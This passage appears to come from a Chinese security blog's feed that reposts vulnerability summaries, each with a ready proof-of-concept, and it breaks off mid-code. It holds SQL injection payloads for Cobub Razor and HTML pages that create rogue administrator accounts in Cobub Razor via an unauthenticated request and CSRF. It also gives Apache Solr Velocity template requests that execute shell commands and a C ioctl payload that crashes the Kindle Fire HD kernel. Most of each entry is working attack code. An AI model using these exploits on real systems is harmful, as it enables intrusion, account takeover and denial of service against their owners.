0.8.0存在SQL注入漏洞，“/application/controllers/manage/channel.php”页面的“channel_name”及“platform”参数过滤不严格导致存在SQL注入漏洞。Cobub Razor是一个在github上开源的系统，漏洞发现者已经将漏洞信息通过<a href="https://github.com/cobub/razor/issues/162">issues</a>告知作者。   </p></blockquote><h3 id="POC实现代码如下："><a href="#POC实现代码如下：" class="headerlink" title="POC实现代码如下："></a>POC实现代码如下：</h3><blockquote><p><a href="http://localhost/index.php?/manage/channel/addchannel">http://localhost/index.php?/manage/channel/addchannel</a>  </p></blockquote><blockquote><p>POST data:  </p></blockquote><blockquote><p> 1.channel_name=test” AND (SELECT 1700 FROM(SELECT COUNT(*),CONCAT(0x7171706b71,(SELECT (ELT(1700=1700,1))),0x71786a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)– JQon&amp;platform=1  </p></blockquote><blockquote><p> 2.channel_name=test” AND SLEEP(5)– NklJ&amp;platform=1</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 转载文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cobub Razor 0.8.0 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobub Razor 0.7.2越权增加管理员账户</title>
      <link href="2021/01/17/Cobub%20Razor%200.7.2%E8%B6%8A%E6%9D%83%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/"/>
      <url>2021/01/17/Cobub%20Razor%200.7.2%E8%B6%8A%E6%9D%83%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#74;&#111;&#x43;&#x61;&#116;&#87;&#70;&#x59;&#64;&#x31;&#54;&#x33;&#46;&#99;&#x6f;&#109;">&#74;&#111;&#x43;&#x61;&#116;&#87;&#70;&#x59;&#64;&#x31;&#54;&#x33;&#46;&#99;&#x6f;&#109;</a></p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><table><thead><tr><th>漏洞名称</th><th>上报日期</th><th>漏洞发现者</th><th>产品首页</th><th>软件链接</th><th>版本</th><th>CVE编号</th></tr></thead><tbody><tr><td>Cobub Razor 0.7.2越权增加管理员账户</td><td>2018-04-09</td><td>ppb（<a href="mailto:&#112;&#112;&#x62;&#x40;&#x35;&#x65;&#99;&#117;&#114;&#105;&#116;&#121;&#x2e;&#99;&#110;">&#112;&#112;&#x62;&#x40;&#x35;&#x65;&#99;&#117;&#114;&#105;&#116;&#121;&#x2e;&#99;&#110;</a>）</td><td><a href="https://github.com/cobub/razor/">https://github.com/cobub/razor/</a></td><td><a href="https://github.com/cobub/razor/">https://github.com/cobub/razor/</a></td><td>0.72</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7745">CVE-2018-7745</a></td></tr></tbody></table><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><blockquote><p>Cobub Razor 0.7.2越权增加管理员账户漏洞，在不登录的情况下发送特定数据包，可新增管理员账号。保存如下利用代码为html页面，打开页面将增加test/test123的管理员账号，漏洞发现者已经将漏洞信息通过<a href="https://github.com/cobub/razor/issues/161">issues</a>告知作者。   </p></blockquote><h3 id="POC实现代码如下："><a href="#POC实现代码如下：" class="headerlink" title="POC实现代码如下："></a>POC实现代码如下：</h3><blockquote><p>利用代码如下：</p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1/index.php?/install/installation/createuserinfo&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;siteurl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;http://127.0.0.1/&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;superuser&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pwd&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test123&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;verifypassword&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test123&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;12@qq.com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 转载文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cobub Razor 0.7.2 </tag>
            
            <tag> 越权增加管理员账户 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobub Razor 0.7.2存在跨站请求伪造漏洞</title>
      <link href="2021/01/17/Cobub%20Razor%200.7.2%E5%AD%98%E5%9C%A8%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>2021/01/17/Cobub%20Razor%200.7.2%E5%AD%98%E5%9C%A8%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#74;&#x6f;&#67;&#97;&#x74;&#x57;&#x46;&#89;&#64;&#x31;&#54;&#x33;&#x2e;&#x63;&#111;&#109;">&#74;&#x6f;&#67;&#97;&#x74;&#x57;&#x46;&#89;&#64;&#x31;&#54;&#x33;&#x2e;&#x63;&#111;&#109;</a></p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><table><thead><tr><th>漏洞名称</th><th>上报日期</th><th>漏洞发现者</th><th>产品首页</th><th>软件链接</th><th>版本</th><th>CVE编号</th></tr></thead><tbody><tr><td>Cobub Razor 0.7.2存在跨站请求伪造漏洞</td><td>2018-03-06</td><td>Kyhvedn（<a href="mailto:&#121;&#105;&#x6e;&#x66;&#101;&#x6e;&#x67;&#x77;&#117;&#121;&#x75;&#101;&#x79;&#x69;&#x40;&#49;&#x36;&#x33;&#46;&#99;&#x6f;&#109;">&#121;&#105;&#x6e;&#x66;&#101;&#x6e;&#x67;&#x77;&#117;&#121;&#x75;&#101;&#x79;&#x69;&#x40;&#49;&#x36;&#x33;&#46;&#99;&#x6f;&#109;</a>、kyhvedn@5ecurity.cn）</td><td><a href="http://www.cobub.com/">http://www.cobub.com/</a></td><td><a href="https://github.com/cobub/razor/">https://github.com/cobub/razor/</a></td><td>0.7.2</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7720">CVE-2018-7720</a></td></tr></tbody></table><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><blockquote><p>Cobub Razor 0.7.2存在跨站请求伪造漏洞，管理员登陆后访问特定页面可增加管理员账号。保存如下利用代码为html页面，打开页面将增加test123/test的管理员账号。  </p></blockquote><h3 id="POC实现代码如下："><a href="#POC实现代码如下：" class="headerlink" title="POC实现代码如下："></a>POC实现代码如下：</h3><blockquote><p>利用代码如下：</p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost/index.php?/user/createNewUser/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test123&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test<span class="symbol">&amp;#64;</span>test123<span class="symbol">&amp;#46;</span>test&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;confirm<span class="symbol">&amp;#95;</span>password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userrole&quot;</span> <span class="attr">value</span>=<span class="string">&quot;3&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user<span class="symbol">&amp;#47;</span>ccreateNewUser&quot;</span> <span class="attr">value</span>=<span class="string">&quot;�<span class="symbol">&amp;#136;</span><span class="symbol">&amp;#155;</span>�<span class="symbol">&amp;#187;</span>�&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 转载文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cobub Razor 0.7.2 </tag>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Solr RCE via Velocity template</title>
      <link href="2021/01/17/Apache%20Solr%20RCE%20via%20Velocity%20Template%20Injection/"/>
      <url>2021/01/17/Apache%20Solr%20RCE%20via%20Velocity%20Template%20Injection/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#74;&#x6f;&#x43;&#97;&#116;&#x57;&#70;&#89;&#64;&#49;&#54;&#x33;&#46;&#99;&#111;&#109;">&#74;&#x6f;&#x43;&#97;&#116;&#x57;&#70;&#89;&#64;&#49;&#54;&#x33;&#46;&#99;&#111;&#109;</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Apache Solr RCE via Velocity template</span><br><span class="line"></span><br><span class="line">Set &quot;params.resource.loader.enabled&quot; as true.</span><br><span class="line"></span><br><span class="line">Request:</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">POST &#x2F;solr&#x2F;test&#x2F;config HTTP&#x2F;1.1</span><br><span class="line">Host: solr:8983</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 259</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RCE via velocity template</span><br><span class="line">Request:</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">GET &#x2F;solr&#x2F;test&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8983</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Response:</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Content-Type: text&#x2F;html;charset&#x3D;utf-8</span><br><span class="line">Content-Length: 56</span><br><span class="line"></span><br><span class="line">     0  uid&#x3D;8983(solr) gid&#x3D;8983(solr) groups&#x3D;8983(solr)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><blockquote><p>from : <a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 转载文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Apache </tag>
            
            <tag> Solr </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Amazon Kindle Fire HD (3rd Generation)内核驱动拒绝服务漏洞</title>
      <link href="2021/01/17/Amazon%20Kindle%20Fire%20HD%20(3rd%20Generation)%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/"/>
      <url>2021/01/17/Amazon%20Kindle%20Fire%20HD%20(3rd%20Generation)%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#x4a;&#111;&#67;&#x61;&#116;&#87;&#x46;&#89;&#x40;&#49;&#x36;&#x33;&#x2e;&#x63;&#x6f;&#x6d;">&#x4a;&#111;&#67;&#x61;&#116;&#87;&#x46;&#89;&#x40;&#49;&#x36;&#x33;&#x2e;&#x63;&#x6f;&#x6d;</a></p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><table><thead><tr><th>漏洞名称</th><th>上报日期</th><th>漏洞发现者</th><th>产品首页</th><th>软件链接</th><th>版本</th><th>CVE编号</th></tr></thead><tbody><tr><td>Amazon Kindle Fire HD (3rd Generation)内核驱动拒绝服务漏洞</td><td>2018-10-10</td><td>大兵</td><td><a href="http://www.amazon.com/">http://www.amazon.com/</a></td><td><a href="https://fireos-tablet-src.s3.amazonaws.com/46sVcHzumgrjpCXPHw6oygKVmw/kindle_fire_7inch_4.5.5.3.tar.bz2">下载连接</a></td><td>Fire OS 4.5.5.3</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11021">CVE-2018-11021</a></td></tr></tbody></table><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><blockquote><p>Amazon Kindle Fire HD(3rd) Fire OS 4.5.5.3的内核模块/omap/drivers/video/omap2/dsscomp/device.c代码中存在漏洞，允许攻击者通过ioctl向驱动模块/dev/dsscomp发生命令为1118064517且精心构造的payload参数，导致内核崩溃。   </p></blockquote><h3 id="POC实现代码如下："><a href="#POC实现代码如下：" class="headerlink" title="POC实现代码如下："></a>POC实现代码如下：</h3><blockquote><p>exp代码如下：  </p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is poc of Kindle Fire HD 3rd</span></span><br><span class="line"><span class="comment"> * A bug in the ioctl interface of device file /dev/dsscomp causes the system crash via IOCTL 1118064517.</span></span><br><span class="line"><span class="comment"> * Related buggy struct name is dsscomp_setup_dispc_data.</span></span><br><span class="line"><span class="comment"> * This Poc should run with permission to do ioctl on /dev/dsscomp.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The fowllwing is kmsg of kernel crash infomation:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">char</span> *driver = <span class="string">&quot;/dev/dsscomp&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> command = <span class="number">1118064517</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **env)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> payload[] = &#123;</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x00000003</span>,</span><br><span class="line">    <span class="number">0x5d200040</span>,</span><br><span class="line">    <span class="number">0x79900008</span>,</span><br><span class="line">    <span class="number">0x8f5928bd</span>,</span><br><span class="line">    <span class="number">0x78b02422</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0xf4c50400</span>,</span><br><span class="line">    <span class="number">0x007fffff</span>,</span><br><span class="line">    <span class="number">0x8499f562</span>,</span><br><span class="line">    <span class="number">0xffff0400</span>,</span><br><span class="line">    <span class="number">0x001b131d</span>,</span><br><span class="line">    <span class="number">0x60818210</span>,</span><br><span class="line">    <span class="number">0x00000007</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x9da9041c</span>,</span><br><span class="line">    <span class="number">0xcd980400</span>,</span><br><span class="line">    <span class="number">0x001f03f4</span>,</span><br><span class="line">    <span class="number">0x00000007</span>,</span><br><span class="line">    <span class="number">0x2a34003f</span>,</span><br><span class="line">    <span class="number">0x7c80d8f3</span>,</span><br><span class="line">    <span class="number">0x63102627</span>,</span><br><span class="line">    <span class="number">0xc73643a8</span>,</span><br><span class="line">    <span class="number">0xa28f0665</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x689e57b4</span>,</span><br><span class="line">    <span class="number">0x01ff0008</span>,</span><br><span class="line">    <span class="number">0x5e7324b1</span>,</span><br><span class="line">    <span class="number">0xae3b003f</span>,</span><br><span class="line">    <span class="number">0x0b174d86</span>,</span><br><span class="line">    <span class="number">0x00000400</span>,</span><br><span class="line">    <span class="number">0x21ffff37</span>,</span><br><span class="line">    <span class="number">0xceb367a4</span>,</span><br><span class="line">    <span class="number">0x00000040</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xec000f9e</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x000001ff</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x0000000f</span>,</span><br><span class="line">    <span class="number">0x0425c069</span>,</span><br><span class="line">    <span class="number">0x038cc3be</span>,</span><br><span class="line">    <span class="number">0x0000000f</span>,</span><br><span class="line">    <span class="number">0x00000080</span>,</span><br><span class="line">    <span class="number">0xe5790100</span>,</span><br><span class="line">    <span class="number">0x5b1bffff</span>,</span><br><span class="line">    <span class="number">0x0000d355</span>,</span><br><span class="line">    <span class="number">0x0000c685</span>,</span><br><span class="line">    <span class="number">0xa0070000</span>,</span><br><span class="line">    <span class="number">0x0010ffff</span>,</span><br><span class="line">    <span class="number">0x00a0ff00</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xff490700</span>,</span><br><span class="line">    <span class="number">0x0832ad03</span>,</span><br><span class="line">    <span class="number">0x00000006</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x81f871c0</span>,</span><br><span class="line">    <span class="number">0x738019cb</span>,</span><br><span class="line">    <span class="number">0xbf47ffff</span>,</span><br><span class="line">    <span class="number">0x00000040</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x7f190f33</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x8295769b</span>,</span><br><span class="line">    <span class="number">0x0000003f</span>,</span><br><span class="line">    <span class="number">0x869f2295</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0xd673914f</span>,</span><br><span class="line">    <span 